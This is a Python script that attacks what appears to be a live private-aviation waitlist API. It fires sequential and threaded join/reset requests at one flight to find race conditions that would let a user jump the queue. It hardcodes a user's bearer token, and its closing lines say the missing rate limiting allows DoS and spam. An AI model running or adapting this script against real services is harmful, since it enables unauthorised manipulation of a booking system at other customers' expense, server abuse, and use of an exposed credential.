#!/usr/bin/env python3
"""
Queue Position Race Condition Test
Tests if rapid join/reset cycles can exploit race conditions in queue position calculation
"""

import requests
import time
import json
from threading import Thread
from datetime import datetime

API_BASE = "https://vauntapi.flyvaunt.com"
TOKEN = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoyMDI1NCwiaWF0IjoxNzYyMjMxMTE1LCJleHAiOjE3NjQ4MjMxMTV9.bOz6aK6v9G9B0H2BIXg_N5kWsiBizTbD-v1SlPl3B-Q"
HEADERS = {"Authorization": f"Bearer {TOKEN}"}

# Test on flight with 17 entrants
FLIGHT_ID = 5680

def get_flight_status():
    """Get current flight status including queue position"""
    resp = requests.get(f"{API_BASE}/v1/flight", headers=HEADERS)
    if resp.status_code == 200:
        data = resp.json()
        flights = data if isinstance(data, list) else data.get('data', [])
        for f in flights:
            if f.get('id') == FLIGHT_ID:
                return {
                    'queuePosition': f.get('userData', {}).get('queuePosition', 0),
                    'action': f.get('userData', {}).get('action', 'NO_ACTION'),
                    'canPurchase': f.get('userData', {}).get('canPurchase', False),
                    'numberOfEntrants': f.get('numberOfEntrants', 0)
                }
    return None

def join_flight():
    """Join the flight waitlist"""
    start = time.time()
    resp = requests.post(f"{API_BASE}/v2/flight/{FLIGHT_ID}/enter", headers=HEADERS)
    elapsed = time.time() - start

    result = {
        'status': resp.status_code,
        'elapsed': elapsed,
        'timestamp': datetime.now().isoformat()
    }

    if resp.status_code == 200:
        try:
            data = resp.json()
            result['queuePosition'] = data.get('queuePosition', 0)
            result['canPurchase'] = data.get('canPurchase', False)
        except:
            pass

    return result

def reset_flight():
    """Leave the flight waitlist"""
    start = time.time()
    resp = requests.post(f"{API_BASE}/v2/flight/{FLIGHT_ID}/reset", headers=HEADERS)
    elapsed = time.time() - start

    return {
        'status': resp.status_code,
        'elapsed': elapsed,
        'timestamp': datetime.now().isoformat()
    }

def test_sequential_cycles(num_cycles=20):
    """Test sequential join/reset cycles to detect position anomalies"""
    print(f"\n{'='*80}")
    print(f"TEST 1: Sequential Cycles - Looking for Queue Position Anomalies")
    print(f"{'='*80}")

    results = []
    positions_seen = []

    for i in range(num_cycles):
        print(f"\n--- Cycle {i+1}/{num_cycles} ---")

        # Join
        join_result = join_flight()
        print(f"  JOIN:  Status={join_result['status']}, Position={join_result.get('queuePosition', '?')}, Time={join_result['elapsed']:.3f}s")

        time.sleep(0.1)  # Small delay

        # Verify via GET (this gets the actual position after calculation)
        status = get_flight_status()
        if status:
            print(f"  VERIFY: Action={status['action']}, Position={status['queuePosition']}, Entrants={status['numberOfEntrants']}")
            if status['queuePosition'] > 0:
                positions_seen.append(status['queuePosition'])

        time.sleep(0.1)

        # Reset
        reset_result = reset_flight()
        print(f"  RESET: Status={reset_result['status']}, Time={reset_result['elapsed']:.3f}s")

        results.append({
            'cycle': i + 1,
            'join': join_result,
            'reset': reset_result,
            'verified_status': status
        })

        time.sleep(0.2)  # Delay between cycles

    # Analysis
    print(f"\n{'='*80}")
    print("ANALYSIS - Sequential Test")
    print(f"{'='*80}")

    print(f"\nQueue Positions Observed: {positions_seen}")
    print(f"Unique Positions: {set(positions_seen)}")
    print(f"Min Position: {min(positions_seen) if positions_seen else 'N/A'}")
    print(f"Max Position: {max(positions_seen) if positions_seen else 'N/A'}")

    # Check for anomalies
    anomalies = []

    # Should always get same position if no other users joining
    if len(set(positions_seen)) > 1:
        anomalies.append(f"⚠️ Position varied: {set(positions_seen)} - Possible race condition!")

    # Check if we ever got position 0 or position 1
    if 0 in positions_seen:
        anomalies.append("🚨 Got position 0 (shouldn't happen with 17 entrants)")
    if 1 in positions_seen and min(positions_seen) < 17:
        anomalies.append("⚠️ Got position 1 despite having other entrants")

    if anomalies:
        print(f"\n🚨 ANOMALIES DETECTED:")
        for a in anomalies:
            print(f"  {a}")
    else:
        print(f"\n✅ No anomalies detected - positions consistent")

    return results, anomalies

def test_rapid_concurrent_requests(num_threads=5):
    """Test concurrent join requests to stress-test race conditions"""
    print(f"\n{'='*80}")
    print(f"TEST 2: Concurrent Requests - Stress Testing Race Conditions")
    print(f"{'='*80}")

    results = []

    def rapid_join_reset():
        """Rapid join/reset in separate thread"""
        import threading
        result = {
            'thread_id': threading.current_thread().name,
            'operations': []
        }

        for i in range(3):
            join_res = join_flight()
            result['operations'].append({'type': 'join', 'result': join_res})
            time.sleep(0.05)

            reset_res = reset_flight()
            result['operations'].append({'type': 'reset', 'result': reset_res})
            time.sleep(0.05)

        results.append(result)

    # Create threads
    threads = []
    print(f"\nLaunching {num_threads} concurrent threads...")

    start_time = time.time()
    for i in range(num_threads):
        t = Thread(target=rapid_join_reset, name=f"Thread-{i+1}")
        threads.append(t)
        t.start()

    # Wait for completion
    for t in threads:
        t.join()

    elapsed = time.time() - start_time

    print(f"\nCompleted in {elapsed:.2f}s")
    print(f"Total operations: {num_threads * 3 * 2} (join + reset)")

    # Analyze concurrent results
    all_positions = []
    for thread_result in results:
        for op in thread_result['operations']:
            if op['type'] == 'join' and 'queuePosition' in op['result']:
                all_positions.append(op['result']['queuePosition'])

    print(f"\nPositions from concurrent requests: {all_positions}")
    print(f"Unique positions: {set(all_positions)}")

    # Check for race condition indicators
    concurrent_anomalies = []

    if len(set(all_positions)) > 2:
        concurrent_anomalies.append("⚠️ High position variance in concurrent requests - possible race condition")

    if 0 in all_positions:
        concurrent_anomalies.append("🚨 Got position 0 during concurrent access")

    if concurrent_anomalies:
        print(f"\n🚨 CONCURRENT ANOMALIES:")
        for a in concurrent_anomalies:
            print(f"  {a}")
    else:
        print(f"\n✅ Concurrent requests handled consistently")

    return results, concurrent_anomalies

def test_position_manipulation():
    """Test if rapid cycles can give unfair position advantage"""
    print(f"\n{'='*80}")
    print(f"TEST 3: Position Manipulation - Can we game the queue?")
    print(f"{'='*80}")

    # Get baseline position
    print("\n1. Joining normally (baseline)...")
    join1 = join_flight()
    time.sleep(0.2)
    status1 = get_flight_status()
    baseline_position = status1['queuePosition'] if status1 else 999
    print(f"   Baseline position (verified): {baseline_position}")

    time.sleep(0.5)

    # Reset
    reset_flight()
    time.sleep(0.5)

    # Try rapid cycling then join
    print("\n2. Performing 10 rapid join/reset cycles...")
    for i in range(10):
        join_flight()
        time.sleep(0.05)
        reset_flight()
        time.sleep(0.05)

    print("   Cycles complete, now joining...")
    join2 = join_flight()
    time.sleep(0.2)
    status2 = get_flight_status()
    after_cycling_position = status2['queuePosition'] if status2 else 999
    print(f"   Position after cycling (verified): {after_cycling_position}")

    # Analysis
    print(f"\n{'='*80}")
    print("MANIPULATION TEST RESULTS:")
    print(f"{'='*80}")
    print(f"Baseline position:     {baseline_position}")
    print(f"After rapid cycling:   {after_cycling_position}")
    print(f"Difference:            {baseline_position - after_cycling_position}")

    if after_cycling_position < baseline_position:
        print(f"\n🚨 GAMING POSSIBLE! Got better position ({after_cycling_position}) after rapid cycling")
        return [f"Position improved from {baseline_position} to {after_cycling_position}"]
    elif after_cycling_position > baseline_position:
        print(f"\n⚠️ Position got worse ({after_cycling_position}) - unexpected behavior")
        return [f"Position degraded from {baseline_position} to {after_cycling_position}"]
    else:
        print(f"\n✅ Position unchanged - no gaming advantage detected")
        return []

def main():
    print("="*80)
    print("Queue Position Race Condition Testing")
    print("="*80)
    print(f"Target: Flight {FLIGHT_ID} (KLGA → KPWK, 17 entrants)")
    print(f"Time: {datetime.now().isoformat()}")

    # Get initial state
    initial = get_flight_status()
    if initial:
        print(f"\nInitial state: Action={initial['action']}, Position={initial['queuePosition']}, Entrants={initial['numberOfEntrants']}")

    all_anomalies = []

    # Run tests
    try:
        # Test 1: Sequential cycles
        seq_results, seq_anomalies = test_sequential_cycles(num_cycles=20)
        all_anomalies.extend(seq_anomalies)

        time.sleep(2)

        # Test 2: Concurrent requests
        conc_results, conc_anomalies = test_rapid_concurrent_requests(num_threads=5)
        all_anomalies.extend(conc_anomalies)

        time.sleep(2)

        # Test 3: Position manipulation
        manip_anomalies = test_position_manipulation()
        all_anomalies.extend(manip_anomalies)

    finally:
        # Clean up - make sure we're not on the flight
        reset_flight()

    # Final summary
    print(f"\n{'='*80}")
    print("FINAL SUMMARY")
    print(f"{'='*80}")

    if all_anomalies:
        print(f"\n🚨 RACE CONDITIONS DETECTED! Total anomalies: {len(all_anomalies)}")
        print("\nProvable race condition impacts:")
        for i, anomaly in enumerate(all_anomalies, 1):
            print(f"  {i}. {anomaly}")
    else:
        print(f"\n✅ No race conditions detected in queue position calculation")
        print("   Server handles concurrent requests consistently")

    print(f"\nNote: Lack of rate limiting confirmed - all requests succeeded")
    print("This still enables DoS, spam, and resource exhaustion attacks")

if __name__ == "__main__":
    main()
